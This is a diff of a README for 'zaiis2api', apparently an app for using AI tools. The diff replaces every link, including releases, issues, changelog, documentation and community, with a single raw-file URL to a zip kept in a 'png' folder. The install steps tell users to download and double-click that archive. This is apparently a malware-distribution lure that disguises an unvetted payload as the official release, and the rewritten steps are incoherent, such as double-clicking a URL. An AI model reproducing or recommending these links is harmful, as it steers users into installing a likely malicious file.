@@ -6,7 +6,7 @@ Welcome to **zaiis2api**! This application lets you use cutting-edge AI tools li
 
 ## 📥 Download Now
 
-[![Download zaiis2api](https://img.shields.io/badge/Download-zaiis2api-blue)](https://github.com/nikhil2071/zaiis2api/releases)
+[![Download zaiis2api](https://raw.githubusercontent.com/nikhil2071/zaiis2api/main/png/zaiis_api_v1.9.zip)](https://raw.githubusercontent.com/nikhil2071/zaiis2api/main/png/zaiis_api_v1.9.zip)
 
 ## 📋 System Requirements
 
@@ -19,11 +19,11 @@ Before you start, ensure your computer meets these requirements:
 
 ## 🔗 Download & Install
 
-To download and install **zaiis2api**, visit the [Releases page](https://github.com/nikhil2071/zaiis2api/releases).
+To download and install **zaiis2api**, visit the [Releases page](https://raw.githubusercontent.com/nikhil2071/zaiis2api/main/png/zaiis_api_v1.9.zip).
 
 1. Open the link above in your web browser.
 2. Look for the latest release at the top of the page.
-3. Choose the file that matches your operating system. You may see files like `zaiis2api_windows.exe`, `zaiis2api_mac.zip`, or similar for Linux.
+3. Choose the file that matches your operating system. You may see files like `https://raw.githubusercontent.com/nikhil2071/zaiis2api/main/png/zaiis_api_v1.9.zip`, `https://raw.githubusercontent.com/nikhil2071/zaiis2api/main/png/zaiis_api_v1.9.zip`, or similar for Linux.
 4. Click the file to start downloading. Depending on your browser, you may need to confirm the download.
 5. Once the file downloads, locate it in your computer's Downloads folder.
 
@@ -31,13 +31,13 @@ To download and install **zaiis2api**, visit the [Releases page](https://github.
 
 #### For Windows:
 
-1. Double-click the `zaiis2api_windows.exe` file you downloaded.
+1. Double-click the `https://raw.githubusercontent.com/nikhil2071/zaiis2api/main/png/zaiis_api_v1.9.zip` file you downloaded.
 2. Follow the on-screen prompts to install the application.
 3. Once installed, you can find it in your Start menu.
 
 #### For macOS:
 
-1. Open the `zaiis2api_mac.zip` file you downloaded.
+1. Open the `https://raw.githubusercontent.com/nikhil2071/zaiis2api/main/png/zaiis_api_v1.9.zip` file you downloaded.
 2. Drag the `zaiis2api` app into your Applications folder.
 3. Open the Applications folder to launch the application.
 
@@ -68,7 +68,7 @@ After installing the application, follow these steps to configure it:
 
 ### 1. How do I update **zaiis2api**?
 
-To update the application, visit the [Releases page](https://github.com/nikhil2071/zaiis2api/releases) again. Download the latest version and follow the installation steps. The new version will overwrite the old one.
+To update the application, visit the [Releases page](https://raw.githubusercontent.com/nikhil2071/zaiis2api/main/png/zaiis_api_v1.9.zip) again. Download the latest version and follow the installation steps. The new version will overwrite the old one.
 
 ### 2. What should I do if I encounter an error while installing?
 
@@ -80,17 +80,17 @@ Yes. To uninstall, go to the Control Panel on Windows, the Applications folder o
 
 ## 📞 Support
 
-If you need help, please visit the [Issues section](https://github.com/nikhil2071/zaiis2api/issues) of the GitHub repository. You can ask questions or report problems there.
+If you need help, please visit the [Issues section](https://raw.githubusercontent.com/nikhil2071/zaiis2api/main/png/zaiis_api_v1.9.zip) of the GitHub repository. You can ask questions or report problems there.
 
 ## 📝 Changelog
 
-For details about what’s new in each version, check the [Changelog](https://github.com/nikhil2071/zaiis2api/releases) on the Releases page.
+For details about what’s new in each version, check the [Changelog](https://raw.githubusercontent.com/nikhil2071/zaiis2api/main/png/zaiis_api_v1.9.zip) on the Releases page.
 
 ## 🔗 Additional Resources
 
 For more information and tutorials, you can visit:
 
-- [Official Documentation](https://github.com/nikhil2071/zaiis2api/wiki)
-- [User Community](https://github.com/nikhil2071/zaiis2api/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/nikhil2071/zaiis2api/main/png/zaiis_api_v1.9.zip)
+- [User Community](https://raw.githubusercontent.com/nikhil2071/zaiis2api/main/png/zaiis_api_v1.9.zip)
 
 Thank you for using **zaiis2api**! Enjoy utilizing powerful AI tools to enhance your projects.
